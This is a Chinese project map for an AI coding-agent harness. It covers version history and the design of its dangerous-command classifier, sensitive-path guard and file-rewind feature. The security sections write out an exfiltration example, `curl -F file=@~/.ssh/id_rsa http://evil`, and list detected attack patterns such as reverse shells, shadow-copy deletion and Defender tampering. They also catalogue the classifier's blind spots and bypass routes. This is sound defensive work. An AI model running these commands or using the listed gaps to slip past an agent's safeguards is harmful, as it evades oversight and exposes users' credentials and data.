# CODE_MAP

agent-shell 的**单文件鸟瞰图**。新读者花 10 分钟读完这份文档，能建立项目的整体心智模型；想深入某个领域再去读链向的分文档。

> 详细分文档：
> - [`docs/ARCHITECTURE.md`](./ARCHITECTURE.md) — 数据流图 + 模块边界 + canonical ordering 不变量
> - [`docs/DECISIONS.md`](./DECISIONS.md) — 33 条 ADR 决策记录（编号 001–035，缺 011/012；ADR-013 tool 错误流；ADR-014 guard 可达性；ADR-015 单一 guard 评估点 + 无死代码；ADR-016 canonical conversation + projections；ADR-017 sub-agent boundary；ADR-018 MCP/skill 扩展；ADR-019 wiki system agent）+ ADR-020/021（v0.14，见 `docs/adr/`）
> - [`docs/IM-GUIDE.md`](./IM-GUIDE.md) — IM 业务集成手册（canonical conversation/databus projection/registry/compose/loop/observability）

---

## 0. 状态

**写于**：2026-08-25 (v0.1) → 2026-09-01 (v0.14) · 2026-09-11 (v0.35 全量追平) · **2026-09-22 (v0.44 基线校正)**

**当前 agent-shell 项目状态**：[已验证] **v0.44 已落地**（有界召回 + Baseline 工作流，ADR-036）。
基准数字（2026-09-22 全量 `npx vitest run`）：**258 个测试文件 / 3039 通过 + 1 skipped + 1 todo / 0 失败**；`src/` **178** 个 `.ts`；`npx tsc --noEmit` **0 错误**。

> ⚠️ 本文件长期滞后。2026-09-22 之前 §0 停在 v0.35 / 216 文件 / 2445 测试，
> ADR 计数停在 19 条。**各节数字以本次校正为准，历史正文保留作演进记录。**

**版本演进 v0.15 → v0.35**（本表追平 v0.14 之后的 21 个版本；详细计划见 `docs/plans/`，ADR 见 §6）：

| 版本 | 主题 | 落点 |
|---|---|---|
| v0.15 | 工具安全 + 工程搜索（ADR-022） | SystemSecurityHook（敏感路径 / 危险命令分类器）+ rg 硬依赖搜索 |
| v0.16 | SecurityRouter + 会话隔离（ADR-023） | SecurityDoor 体系（dangerous-command / write-approval）+ per-session 安全状态 |
| v0.17 | loop↔hooks 解耦 + 多会话与历史恢复 | `im/loop-hooks.ts`（collectLoadedSources 等点位）+ session 存档/恢复 |
| v0.18 | 渐进式工具披露 | `load_tools` 工具（工具按需披露，schema 不一次灌满上下文） |
| v0.19 | prompt 工程 + code specs + MEMORY.md（ADR-024） | `im/prompt/` 分层拼装 + 静态提示词 + 用户级 MEMORY.md 设计 |
| v0.20 | hook 修复 + 渲染基座 | `im/hooks/` 审计/审批 hook 归位 + `src/rendering/` 渲染层 |
| v0.21 | Signal Gate 基础设施（ADR-026） | `src/signals/` 信号关：前后端信息流唯一管理点 |
| v0.22 | Web UI | `src/webshell/` 前端服务端 + 会话视图契约 |
| v0.23 | 设置与 provider 管理 | `src/config/` 配置面（provider / 模型清单） |
| v0.24 | 交付物 UX | 交付物卡片与预览链路 |
| v0.25 | 装配修复 + 设置部署 | assembly 契约测试 + 设置持久化 |
| v0.26 | CLI / TUI | `tests/cli/` 会话视图 + TUI 交互 |
| v0.27 | read-before-edit | 编辑前强制读取（防盲改文件） |
| v0.28 | 工具自描述 + KimiCode 对齐 | 工具 schema 自描述（`ast_grep` / `search_replace` 等） |
| v0.29–v0.31 | 增量并入相邻版本 | 无独立计划：时间权限放宽 600s→900s（v0.29）、压缩与 system-agent 记忆（v0.31 / ADR-031） |
| v0.32 | 模型目录 + 推理控制 | 模型清单与 reasoning 参数控制 |
| v0.34 | 并发与持久化 | Signal Gate 会话排队（`signals/session-queue.ts`）+ 僵尸目录防护 + mailbox 落盘/3 天 TTL + 子代理工作区上下文 |
| **v0.35** | **PowerShell 危险命令加固** | **分类器加 `shell` 方言参数（bash / powershell 分表）+ `&`/换行分隔符 + 操作数后置 flags + 内嵌 PS 宿主检测** |
| **v0.36** | **文件改动可恢复（file-history）** | **写类工具写盘前自动快照（内容寻址 + zlib + 配额 GC）+ `session.rewind` 回滚命令（与 `session.undo` 正交）** |
| **v0.36.1** | **file-history 缺口修复 + 撤销按钮** | **索引写串行化（零丢失）+ 失败可观测 + 只读命令不留底 + 保护边界显性化 + 网页端「撤销更改」（走信号关）** |
| **v0.37** | **提示词模型族路由（唯一基底 + 双槽位）** | **`FULL_PROMPT_TEMPLATE` 仍是唯一一份，只开 `{persona_section}` / `{workflow_section}` 两个槽位按模型 id 正则注入（deepseek / glm）；安全、编码原则、双工具披露、架构/记忆契约结构上不可被变体覆盖** |
| **v0.38** | **子代理角色预置 + 模型族扩展** | **两个内置子代理（探索只读 / 改码可写）+ 四层组装（角色→工作区→纪律基底→AGENTS.md）+ 交互协议；模型族扩到 kimi / qwen / gpt / claude** |
| 未发布 | ADR-028/029/030 | args 持久化与用户同意、per-session 权限、安全二分法（文档已落，见 §6） |

**v0.39 → v0.44（2026-09-22 补齐，详细计划见 `docs/plans/`）**：

| 版本 | 主题 | 落点 |
|---|---|---|
| v0.41 | **Goal 模式**（ADR-035） | HOOK 6 `beforeComplete`（judge → G1 → G2 → reminder）+ 独立 goal judge + G0–G3 压缩梯度 + `goal.set/clear/get` 信号关命令 + CLI `--goal/--goal-rounds` |
| v0.42 | **有界召回转交**（ADR-036 D1–D4） | 20K 工具结果投影 / Databus token range+cursor / 200K 直接召回 ledger / large-recall 委派 |
| v0.43 | 多智能体信息架构提示词 | **计划落盘待执行**（`docs/plans/v0.43-*.md`，目标文件路径是旧路径，需先修） |
| v0.44 | **结构化 large-recall 报告 + Baseline 工作流**（ADR-036 D5） | `f50fdfd` / `083a05b`；`src/im/system-agents/large-recall.ts` + `src/host/workflow/` |

**`fetch_output` 未实现（2026-09-22 核实）**：`docs/plans/工具更新代码计划.md` 称 Phase 1 三工具
（`search_replace` / `ast_grep` / `fetch_output`）已落地。实测 `src/im/tools/index.ts` 注册了前两个，
**`fetch_output` 全仓 grep 零命中**——计划文档与代码不符，属于"有计划未实现"。

**进程监督 ≠ 后台任务（2026-09-22 核实）**：`list_processes` / `kill_process`（v0.29）只是
**单次同步调用期间的进程监督**——`ProcessRegistry` 在 `onSpawn` 时 track、命令结束即 untrack。
仓库里**没有"脱离调用存活的后台任务"概念**；工具描述与提示词明确禁止 `&` / `nohup` / `Start-Process`
后台化（2026-09-18 用户拍板：长任务必须前台执行）。bash 前台超时上限已放宽到 `BASH_TIMEOUT_CAP = 3600s`。

**v0.35 重要变化**（vs v0.34，计划 `docs/plans/v0.35-powershell-dangerous-command-hardening.md`）：

- **分类器接受 shell 方言**：[已验证] `checkDangerousCommand(command, shell: ShellKind = 'posix')`。`bash` 工具声明 `'posix'`，`powershell` 工具声明 `'powershell'`；door（`src/security/doors/dangerous-command.ts`）与审批 hook（`src/im/tools/security/approval-hook.ts`）各自按键下发。**为什么必须显式声明**：两个 shell 在 `rm` / `del` / `curl` / `start` 这些名字上语义不同，之前共用一张 POSIX 表把 PowerShell 全漏了；而一旦把 PowerShell 表无条件并进去，bash 侧 `curl https://…` / `rm file.txt` / `echo x > out.txt` 等 16 条正常用例会被误判。
- **PowerShell 表按爆炸半径分组**：[已验证] `PS_REMOVE_CMDS`（`Remove-Item` 及官方别名 `ri`/`rm`/`rmdir`/`del`/`erase`/`rd`，**仅递归或磁盘根目标才拦**，沿用 POSIX `rm` 的产物豁免）、`PS_DESTRUCTIVE_CMDS`（磁盘 `format`/`Clear-Disk`/`Initialize-Disk`/`diskpart`、电源 `Stop-Computer`/`Restart-Computer`/`shutdown`、内容清空 `Clear-Content`/`clc`）、`PS_PRIVILEGE_TOOLS`（`Set-ExecutionPolicy`/`Enable-PSRemoting`/计划任务/`icacls`/`takeown`）、`PS_NETWORK_TOOLS`（`iex`/`iwr`/`irm`/`curl`/`Start-Process`）。别名以 Microsoft Learn 各 cmdlet 的 Notes 段为准（`del`/`erase`/`rd`/`ri` 全平台，`rm`/`rmdir` 仅 Windows）。
- **分隔符补齐 `&` 与换行**：[已验证] step 8 分隔符从 `&& / || / ;` 扩为 `&& / || / ; / & / \n`——`sleep 1 & rm -rf x` 与多行脚本此前整体被判安全，因为首 token 是 `sleep` / `true`。
- **操作数后置 flags 修复**：[已验证] `rmFlags` 原先遇到第一个非 `-` token 就 `break`，`rm /tmp/x -rf`（GNU getopt 允许的写法）漏判；现扫描全部 token。
- **循环体关键字剥离**：[已验证] classify 先剥前导 shell 关键字（`do` / `then` / `else` / `{`），否则 `;` 拆出的片段 `do rm -rf x` 首 token 是关键字，所有首 token 规则都命中不了。
- **内嵌 PowerShell 宿主**：[已验证] `bash` 里写 `powershell -Command "Remove-Item -Recurse -Force C:\Users"` 时，抽取 payload 按 PowerShell 规则复检——否则 bash 工具是绕过 PowerShell 规则的洗白通道。
- **测试**：[已验证] 分类器 97 → **195** 条（v0.35 +61：PowerShell 破坏/提权/网络/安全四组 + 方言隔离 + 内嵌宿主 + 操作数后置 flags + 分隔符回归；**v0.35.1 +37**：cmdlet 管道 / 括号子表达式 / 脚本块、`-EncodedCommand` 解码、Windows 攻击面、`Invoke-Command` 远程门控、低误报 POSIX 补齐）；door 新增 3 条接线断言（证明 door 确实按工具声明方言）。全量 216 文件 2483 通过 / 0 失败。

**v0.35.1 追加变化**（同日，用户要求本轮全解；计划 §11.6）：

- **判定从"取第一段命令名"改为结构分段**：新增 `psSegments` / `psSubExpressions` / `psHereStrings` / `stripPunct`。原因：PowerShell 的破坏性常来自**结构组合**——官方文档 Example 4 推荐的递归删除写法 `Get-ChildItem * -Recurse | Remove-Item` 把递归参数放在**上游管道段**，取首段命令名必然漏判；同类还有 `Remove-Item (Get-ChildItem -Recurse)`（括号子表达式）与 `ForEach-Object { Remove-Item -Recurse -Force $_ }`（脚本块）。
- **`-EncodedCommand` / `-e` / `-ec` 解码复判**：UTF-16LE base64 解码后按 PS 规则再判；解不出可读文本则 **fail closed**（真实 CLI 就这么拼命令，例如 happier 的 `buildEncodedPowerShellCommand`，而它对字符串分类器是不透明载荷）。
- **新增方言无关的 Windows 攻击面段**：`.NET TcpClient` 反向 shell、`netsh portproxy/advfirewall`、`vssadmin delete shadows`、`wbadmin delete`、`bcdedit` 恢复项篡改、`Add-/Set-MpPreference` Defender 篡改、`del/rd/rmdir /s`、以及 Windows 原生 exe `runas`/`takeown`/`icacls`/`schtasks`（后四者从 PS 表**移出**，避免同名两处登记产生不可达数据）。**不门控**的理由：门控反而制造绕过（bash 工具里 `cmd /c del /s /q C:\x` 仍是递归删除）。
- **补齐低误报 POSIX 判定**（AtomCode 有、本移植丢了的）：`kill -9`、`killall`、`chown`/`chgrp`、`mkfifo`/`mknod`、SQL `drop table`/`drop database`、ORM 迁移重置（`migrate:fresh`/`db:reset` 与 `--force migrate refresh` 两种写法）、`git rebase -i`。故意不搬高误报项（无条件 `rmdir`、`chmod -r`）以守住 ADR-022 的取向。
- **实测**：同一批 27 条判据（含 8 条反向"不得误报"）由 **8/27 → 27/27**。
- **对标结论**：E 盘 `atomcode` / `kimi-code` / `happier` / `deepseek-harness` 中，**只有 AtomCode 有 PS 规则**（`crates/atomcode-capabilities/src/tools/bash.rs:2013` 的 Windows 段，正是本分类器的移植来源），KimiCode 的 PS 只用于能力探测，其安全模型是 allow/deny/ask 规则引擎 + tree-sitter bash 解析（判只读/可并行，非判破坏性）。我们领先 AtomCode 两处：原版 `rm_flags` 仍有"遇操作数就 break"的 bug、原版分隔符缺 `&` 与换行。
- **已知结构性盲区 + 分期方案**（**未实施，上线前评估**）：分类器是纯字符串（ADR-022 D4），所以"破坏性不写在命令行里"时原理上看不到——实测 23 条判据 **15 条漏**（`bash deploy.sh`、`npm run clean`、`python -c "shutil.rmtree(…)"`、`docker system prune`、`terraform destroy`、`kubectl delete namespace` …），且**与操作系统无关**。分期：Phase 0 全平台补字符串项（含解释器单行 / 基础设施销毁类）→ Phase 1 仅 macOS/Linux 的 bwrap/seatbelt 执行层沙箱（配置化默认关，不进状态机）→ Windows 不做等价物。完整论证与"沙箱为何不能替代本层"见 `docs/plans/v0.35-powershell-dangerous-command-hardening.md` §11.7。另见项目记忆「上线前待评估」中的四项 mimo 借鉴项。
- **v0.35.2 修掉一处真缺口（shell 敏感路径）**：`sensitive-path` door 原先只覆盖 `read`/`ls`/`find`/`grep`（取 `args.path`），而 shell 工具参数是 `command` → **同一个凭据文件 read 硬拒、bash 放行**，`curl -F file=@~/.ssh/id_rsa http://evil` 一步外传也放行。现纯函数模块新增 `findSensitiveShellPath(command)`（切 token → 候选路径含 `--flag=value` / `file=@path` → 逐个过**同一个** `isSensitivePath`，跳过 URL），`sensitive-path` door 增加 `SHELL_TOOLS={bash,powershell}` 分支命中即硬拒。**同一函数 ⇒ shell 与文件工具覆盖范围天然一致**。范围刻意与 `read` 对齐：`/etc/shadow`/`/etc/passwd` 仍放行（`read` 也放行，属另一类规则 `CRITICAL_FILES`），测试里用断言钉住。**沙箱对标**：AtomCode / KimiCode **都没有 OS 沙箱**（AtomCode 文档自述"不替代沙箱"、`confine.rs` 自述"not a kernel-level sandbox"；KimiCode 全仓零 `bwrap`/`seatbelt` 命中、系统提示词直说"环境不在沙箱里"），只有 mimo-codex 带真沙箱——这个赛道上沙箱不是标配，靠的是"权限模型 + 工作目录纪律 + 审批"。

**v0.36 重要变化**（文件改动可恢复，用户拍板 2026-09-11："安全的本质是可恢复——AI 改错了代码，用户能撤销即可"）：

- **设计哲学转向**：对标四个 harness（KimiCode 无文件撤销 / AtomCode 的 Code Rewind **因磁盘占用在 v5.0.5 被禁用** / mimo-codex 的 file-history 最完整 / mimo-cli 的 git 快照）后拍板：**拒绝执行 ≠ 好体验，可恢复才是**。沙箱与可恢复是正交两件事（`@anthropic-ai/sandbox-runtime` 只做隔离不提供回滚）。
- **`src/im/tools/file-history.ts`（核心）**：写操作**之前**把原文件内容留底——内容寻址（sha256 命名，同内容只存一份）、zlib 压缩、`index.jsonl` 追加索引。**四道闸门与功能同批交付**（AtomCode 的教训：没配额的快照必然吃爆磁盘被砍）：单文件 2MB 上限（超限只登记 `skipped:'too-large'`，回滚时如实进 `unbacked` 不假装成功）/ 条数 2000 / 总字节 128MB / LRU 丢弃最旧 + 孤儿对象清扫。**保护范围 = 白名单**（代码 + md/html/css + json/yaml/toml 等结构化文本 + Makefile 等无扩展名常客；**docx/xlsx 刻意不保护**——zip 包快照无信息量且 Office 自带版本历史，用户拍板）+ 目录黑名单（node_modules/.git/dist/…）+ 敏感文件排除（复用 `isSensitivePath`，快照绝不扩大凭据落盘面）。**快照是旁路**：任何失败都不阻断用户真正的写操作（v0.36.1 起失败出 `logger.warn`，不再静默吞掉）。
- **接入点（最小侵入）**：`write.ts` / `edit.ts` / `search-replace.ts` 加**可选第二参数** `SnapshotContext`（不传即原行为，现有测试零改动——同 v0.35 的方言参数手法）；`bash.ts` / `powershell.ts` 走执行期回调 `snapshotFor(ctx.sessionId)`，执行前用 `extractShellPathCandidates`（v0.35.2 同一套 token 切分，parity by construction）对命令行里写明的目标留底（`rm a b`、`sed -i`、`mv`、`>` 重定向）。无 sessionId 的执行路径（单测）不快照。落点 `<dataDir>/file-history/<项目指纹>/`（per-session registry 按 workDir 建实例），不写进用户项目、不污染 git。
- **`session.rewind` 回滚命令**：照 `session.undo` 链路（`signals/types.ts` 命令 union + `gate.ts` case + `src/host/session-rewind.ts` + `assembly.ts` handlers）。**回滚权只在用户**（LLM 不持有 rewind 工具，四仓一致做法）；与 `session.undo` 正交（那个撤对话、这个撤文件）。同路径多条记录取**最早**一条（连续改多次撤回改动前状态）；回滚后记录从索引移除（不双重撤销）；AI 新建的文件（`existedBefore:false`）回滚时删除。回执三分：`restored` / `deleted` / `unbacked`——不假装成功。
- **诚实边界**：命令行里没写明的破坏性（`bash deploy.sh` 的脚本内容、`python -c "…"` 的内联代码）快照原理上看不到，与分类器的结构性盲区一致——靠 turn 级对话 undo 或用户自己的 git 兜底。**删库防线（回收站 vs 后训练）用户拍板上线前再定**（tradeoff：回收站会废掉"帮用户清理磁盘"类任务，见项目记忆）。
- **测试**：[已验证] `tests/im/tools/file-history.test.ts` 17 条（白名单/黑名单/敏感排除、新建文件删除、同内容去重、restored/deleted/unbacked 三分、多记录取最早、配额 GC + 对象清扫、shell 命令抽取、0 记录拒绝语义）。全量 **217 文件 / 2514 通过 + 1 skip + 1 todo / 0 失败**；根 + cli + webapp 三处 tsc 0 错误。

**v0.36.1 重要变化**（file-history 缺口修复 + 网页端「撤销更改」按钮，2026-09-12；计划 `docs/plans/v0.36.1-file-history-hardening-and-rewind-ui.md`，**ADR-032**）：

- **P0-1 并发写竞态**：`writeIndex`（read → tmp → rename）与 `appendIndex` 交错时，append 可能落在**已被 rename 掉的旧 inode** 上 → 该条记录消失；Windows 上更常见的表现是 rename 被占用 → **prune 静默不回收**。修法 = 实例内 `withIndexLock`（Promise 队列）串行化**索引**读写（对象写入是内容寻址且幂等的，不串）。新回归测试：`rewind` 与 20 条并发 record 竞争后**一条不少**（prune 那组只能钉"不失控"，因为 prune 本身就要按配额裁）。
- **P0-2 静默失败可观测**：`recordInner` / `prune` / `rewind` 的 catch 加 `logger.warn`（组件名 `file-history`）。只 warn 不抛，旁路语义不变——"零观测"曾让 prune 失败看起来像"一切正常"。
- **P1-1 只读命令不再留底**：新增纯函数 `isWriteLikeShellCommand(command)`（方言混编小表：`rm`/`mv`/`cp`/`sed -i`/`touch`/`tee`/`>` 重定向/`git checkout|restore|clean|reset`/`Remove-Item`/`Set-Content`… + `sudo` 等包装前缀 + `do/then/else/{` 前导关键字剥离），`recordShellCommand` 先过它。`grep foo.ts` / `cat bar.md` / `npm run build` 不再污染 rewind 语义与配额。**判不出来就不留底**（宁可漏快照不可误快照）；**不依赖危险命令分类器**（两者关心的不同：那个问"危不危险"，这个问"写不写"）。
- **P1-2 保护边界显性化（不扩大保护范围）**：`record` 返回值改为 `SnapshotRecordResult`（`{ snapshotted, reason?: 'unprotected'|'too-large'|'sensitive', relPath? }`）；`write`/`edit`/`search_replace` 在"确实写了但没留底"时于返回文本尾部追加一行（单文件 `snapshotGapNotice`，多文件 `summarizeSnapshotGaps` 汇总）。**目录永不登记**——若按"新建"登记，rewind 会 `rm` 掉整个目录（实现里显式返回 + 测试钉住）。
- **死代码清理（ADR-015）**：删 `tools/index.ts` 的 `registry.fileHistory` 私有挂载点（全 src 零读取；生产一直走 `assembly.ts` 的注入路径）。三个测试文件（integration / integration-extra / concurrency）改为**注入式**构造，更贴近真实装配。
- **前端「撤销更改」按钮（仅网页端**；用户 2026-09-12 裁定 CLI 不做 `/rewind`）：`ProducedFilesRow` 置于「查看工作区」左侧；点击发 gate 命令 `session.rewind { sessionId, entries: 'last-turn' }`（`rewindCommand` 纯函数钉住契约——**只走信号关**），loading 态禁用防重复点击，结果面板按 `restored` / `deleted` / `unbacked` **三组**展示（含"没有可撤销的改动"空态与失败原文），常驻到点关闭。
- **`'last-turn'` 取数语义**：新增 `countLastTurnRecords(sessionId)`——快照记录没有 turn 标识，按 ts 簇聚类（间隔 > 10 分钟视为跨 turn），**刻意选择的近似**（偏差两边都有，结果面板逐条列出具体文件可兜底）；无记录时返回**空结果而非报错**（前端自然落到"没有可撤销的改动"）。
- **测试**：[已验证] 根 `tests/im/tools/file-history*.test.ts` 4 文件 **57 条**（新增：并发零丢失、目录不登记、通知文案、`last-turn` 三态 + 跨簇切分）；webapp 新增 `tests/rewind-ui.test.tsx` **9 条**（含真 DOM 交互：命令契约 / loading 禁用 / 三组渲染 / 错误原文 / 关闭收起）。

**v0.37 重要变化**（提示词模型族路由：唯一基底 + 两个可注入槽位，2026-09-12；对标 MiMoCode `mimo-cli/packages/opencode/src/session/{system.ts,prompt/*.txt}`）：

- **起因：上一版变体被判不合格**。另一个会话先写成 `PROMPT_DEEPSEEK_FULL` / `PROMPT_GLM_FULL` 两份**整份模板**（+199 行，零测试）。审查发现三个问题：① **死代码**——`assembly.ts` 的 `buildStaticPrompt` 从不传 `modelId`，路由条件恒 `undefined`，148 行变体一行都没生效；② **功能回退**——变体是从通用模板**复制后改**，漏掉了 `# Architecture Management` 与 `# Memory Management` 两节契约（而注入源 `injections/{memory,architecture}.ts` 只裸贴文件内容、不带"请维护此文档"的指令，兜不住），且安全规则从 7 条被削到 5/4 条；③ **结构病根**——MiMo 是"每族一份完整 `.txt`"，副本之间不共享，源改了副本不知道。**派生式变体必然漂移**。
- **新结构：唯一基底 + 双槽位**。`FULL_PROMPT_TEMPLATE` 仍是唯一一份（首行 `{persona_section}`、工具披露之后 `{workflow_section}`），其余段落（安全 7 条 / 编码原则 / 代码信息驱动 / **双工具披露** `{tooling_section}` / 行动策略 / 架构与记忆契约 / 注入防御）**只有一份，变体结构上碰不到**——把"变体不许削安全和契约"从纪律变成结构约束。槽位用**显式占位符**而非标题锚点匹配：位置写在模板里（挪位置=改模板），且可被测试断言。
- **路由**：`resolvePromptVariants(modelId)` 按 id 子串匹配（`deepseek` / `glm`，大小写无关），未命中回落 `PERSONA_BASE + WORKFLOW_BASE`；`selectPromptTemplate(mode, modelId)` 负责填槽。`minimal` / `none` 模式不受路由影响。
- **素材来源与改写（重要）**：人格与 workflow 提炼自 MiMoCode 的 `prompt/minimax.txt`（该族人格写得最强："You are not a chatbot. You are an engineer with a keyboard and a deadline."）。**MiMo 专属约束一律剥掉**：Bun / CLAUDE.md / packages-opencode / `question`、`actor`、`task` 工具名 / "powered by minimax"——照抄会教模型调用本仓库不存在的工具。**刻意不搬**：`deepseek.txt` 的"Explore 限 15 次工具调用"（数字是拍脑袋的，MiMo 也只有 deepseek 一份有；改用可检查的条件"同一文件/同一 region 读两次就停"）、`Git Safety` 段（用户裁定只搬人格 + workflow）。
- **接线点（过接线验收纪律）**：`assembly.ts:779` 的 `buildStaticPrompt({...})` 传 `modelId: attachPlan.model`（同函数 673 行已在用该字段）。**不传这一行，全部改动等于白写**——这正是上一版踩的坑。
- **测试**：[已验证] 新增 `tests/im/prompt/model-variant-routing.test.ts` **11 条**：路由（deepseek / glm / 未知 / 大小写）+ 回落 + 填槽后无残留占位符 + **统一段恰好各出现一次**（含未命中 id）+ minimal/none 不受影响。全量 **221 文件 / 2562 通过 + 1 skip + 1 todo / 0 失败**；根 tsc 0 错误。
- **ADR / 计划**：**ADR-033**（`docs/adr/0033-prompt-model-family-routing.md`，已登记 DECISIONS.md）；计划 `docs/plans/v0.37-prompt-model-family-routing.md`（含 §0 上一版不合格的逐条核实、§3 架构图、§7 执行结果、§8 DoD 核对）。
- **保留不动（用户 2026-09-12 判断）**：`section-builder.ts` 的 `buildToolingSection` 输出头 `你可以使用以下工具完成任务：` 保持中文——"英文里一句中文反而醒目，对工具提示是加分"。

---

### 历史变化（v0.14 → v0.6，早期逐版流水）

**v0.14 重要变化**（vs v0.13.1）—— observability foundation + config cleanup（ADR-020 + ADR-021，计划 `docs/plans/v0.14-observability-and-config-cleanup.md`）：

- **structured logger**：[已验证] `src/shared/logger.ts`——依赖图最底层（与 json-schema/tool-context 平级），5 级 + NDJSON sink + pino 风格 `child(bindings)`。`level`/`ts`/`msg` 由 emit 函数拥有（caller 不可伪造，防 spoofing）。默认阈值 `warn`（静默），`setLevel`/`setSink` 可换。
- **关键事件日志化**：[已验证] `runIMLoop` 发 `runIMLoop start/completed`、`guard tripped`（含 hits + finalMetrics）、`protocol error`、`shell terminated`、`tool errors in round`、`driveCoordinator.tick unhandled rejection`；DriveCoordinator 全路径（tick / dispatchCompression start/ok/failed/skipped / M3 archive start/ok/failed / mailbox notice failed）；stateLine（appendBlock/appendSummary/rawArchive ok/failed）。fire-and-forget 静默丢错路径关闭。
- **公开 API 面**：[已验证] `src/index.ts`——re-export runIMLoop / createMinimalIM / createBuiltinTools / createSubAgentRegistry / bootstrapExtensions / createConfig / DEFAULT_MEMORY_CONFIG / Logger 全家。`package.json` 加 `main` + `exports`。既有 import 路径不动（纯 sugar）。
- **MCP stdio env 白名单**：[已验证] `connection.ts:buildSafeEnv`——只透传 PATH/HOME/USERPROFILE/LANG/LC_ALL/TZ/TMPDIR/TMP/TEMP + cfg.env 显式覆盖。SDK `getDefaultEnvironment()` 不再使用（此前会整包转发 process.env，含 ARK_KEY 等 secret）。
- **turn.id UUID 化**：[已验证] `turn.ts:mintTurnId(prefix)` = `prefix-${randomUUID()}`，替换 4 处 `Math.random().toString(36).slice(2)` 内联生成（6 字符 base36 ≈ 4.7 万批次一次碰撞）。
- **MemoryConfig**：[已验证] `src/shell/memory-config.ts`——M0-M3 阈值（200K/500K/900K）从模块常量迁为可配置类型；`classifyMemoryLayer(tokens, config?)` 双参签名（默认值不变，原子迁移）；经 `IMLoopOptions.memoryConfig` → 投影 + DriveSnapshot 两处贯穿（两个 layer 判定点同配置）。
- **maxSubAgentDepth**：[已验证] `ShellConfig.maxSubAgentDepth`（默认 3）替代 `MAX_SUB_AGENT_DEPTH` 常量。三级优先级：子代理 cfg.config override → deps.defaultConfig → DEFAULT_CONFIG；子代理只能调低（validateShellConfigOverrides 约束 ≤ DEFAULT）。
- **wiki guard 迁移 + 工具 category 补全**：[已验证] registry.execute() 的 inline wiki 检查移除，改为 `createWikiAgent` + `bootstrapExtensions` 两处注册 SecurityHook（registry 保持 prefix-agnostic）。8 个内置工具补上显式 concurrency category（此前缺省 'command'，read 工具被错误限 3 并发而非 5）。

**v0.13.1 重要变化**（vs v0.13）—— wiki system agent（ADR-019，已落地；guard 实现从 registry inline 检查演进为 SecurityHook，见 v0.14 段）：

- **wiki-mcp server**：[已读未验] `src/mcp-servers/wiki-mcp/`——独立进程，MCP stdio 连接。复用 literature wiki-mcp（`本地文学 wiki-mcp`）的 server/lib/data 三层架构，领域适配为代码（module/interface/function/class/pattern/concept 6 类型）。工具名前缀 `wiki__` 做命名空间隔离。15 核心工具 + 2 新工具（`scan_codebase` + `render_md`）。
- **上下文注入守卫**：[已读未验] `registry.execute()` 对 `wiki__` 前缀工具检查 `ctx.isWikiAgent`，仅 wiki agent 可调用。不靠接线层约束，靠运行时 ctx 校验。
- **wiki system agent**：[已读未验] `src/im/system-agents/wiki-agent.ts`——通过 `createSystemAgent` factory 创建，`loopOpts.isWikiAgent = true` 上下文注入，`toolRefs = [wiki-mcp tools]`。
- **scan_codebase 路径指针**：[已读未验] 轻量扫描（文件名 + 导出 + 注释），AST 解析留未来。
- **MD 渲染**：[已读未验] 复用 literature wiki-mcp `visualizer/export-md.js` 管线，模板改为代码领域。
- **前端 API 契约**：[已读未验] wiki agent 暴露的工具 schema 即为未来前端 REST/WebSocket API 的契约，计划文档中明确标注（`/api/wiki/scan` POST、`/api/wiki/generate` POST、`/api/wiki/render/:cardId` GET、`/api/wiki/search` GET、`/api/wiki/cards/:cardId` GET）。
- **不破坏现有架构**：不改动 warehouse/compressor/recall 的 toolRefs，不改动 MCP/skill 安全壳子（v0.13 已落地）。不引入新的 guard/metric/config 字段（ADR-015）。

**v0.13 重要变化**（vs v0.12.4）—— MCP/skill 扩展系统（ADR-018，推翻 ADR-016 §11 "no mcp/skill ecosystem"）：

- **MCP 连接**：[已验证] `src/mcp/` 5 文件——`config.ts`（schema 校验 + JSON 加载）、`connection.ts`（**唯一 SDK 触点**，对外只暴露 `McpConnection` 三方法窄接口：listTools/callTool/close）、`boot.ts`（连接管理 + 工具转换 + registry 注册 + close）、`index.ts`（re-export，不 re-export SDK 类型）、`version.ts`。stdio + HTTP 双传输；stdio env = SDK 默认安全环境 + cfg.env 覆盖（不整包继承 `process.env`，防密钥外泄）。
- **JS/TS 模块 skill**：[已验证] `src/skills/` 3 文件——`loader.ts`（`loadSkillsFromDir`：扫描 .ts/.js/.mts/.mjs，动态 import，校验 name/description/execute，查重）、`text-loader.ts`（text skill 预注入）、`index.ts`。skill 是一等工具，与 system 工具同走 `ToolExecutor` 契约。
- **一键装配**：[已验证] `src/extensions.ts`——`bootstrapExtensions({ registry, mcpServers?, skillsDir? })`，MCP 先 skill 后（顺序保证 collision detection），fail-fast + 幂等 `close()`。
- **子代理经 policy 开放**：[已验证] v0.12.2 一刀切禁用 MCP/skill ref 被**推翻**（D7 行为变更）。`DEFAULT_SUB_AGENT_TOOL_POLICY` default='allow' ⇒ 子代理默认可用 MCP/skill 工具。单层执法（config.ts 唯一检查点）。
- **resolveRef 单分类器**：[已验证] `registry.resolveRef(name)` 顺序与 execute 派发一致（system → mcp → skill）；system-agent.ts 用它分流 toolRefs。
- **SDK 依赖**：`@modelcontextprotocol/sdk@1.30.0` 成为运行时依赖（隔离在 src/mcp/ 内）。
- **测试**：[已验证] `tests/mcp/` 4 文件（config/boot/stdio/http）+ `tests/skills/` 1 文件（loader）+ `tests/extensions.test.ts` 1 文件 + `tests/im/sub-agent/policy-mcp.test.ts` + `tests/im/sub-agent/mcp-pentest.test.ts`。

**v0.12 重要变化**（vs v0.11.2）—— hierarchical sub-agent tree：

- **AgentTree + AgentNode**：[已验证] `src/im/sub-agent/tree.ts`——树形子智能体结构，UUID instance id，family-bus isolation（每个 family 独立 Databus），`rebindRoot` 对齐 workingAgentId。
- **mail receipts**（v0.12.1）：`sentStatus` + anti-bombing guidance + timer fields。
- **tool-registration iron rule**（v0.12.2）：retire `compress_block`，注册时一次性校验。
- **compression replacement**（v0.12.3）：raw history recall 替代压缩。
- **restore parallel compression**（v0.12.4）：compressor returns JSON, coordinator persists atomically。

**v0.10.2 重要变化**（vs v0.10.1）—— state-line 实现（ADR-016 §4/§8）：

- **5 个新源文件**（`src/im/state-line/`）：
  - `types.ts` — CuratedMemory（ADR-016 §2.2 11-field 逐字，无 metadata）+ M3Summary + StampRecord + ToolContext + StateLine 类型
  - `jsonl-writer.ts` — `appendJsonl<T>` 单函数，mkdir -p + appendFile
  - `append-stamp.ts` — `appendStamp`，不去重（§7.2 #5: duplicate silently, reader de-duplicates）
  - `chroma-bridge.ts` — `embedM3` + `queryM3`，spawn `D:\trae\runtime\python\python.exe scripts/embed.py`，15s timeout，错误返回 `{ok:false,error}` 不 throw
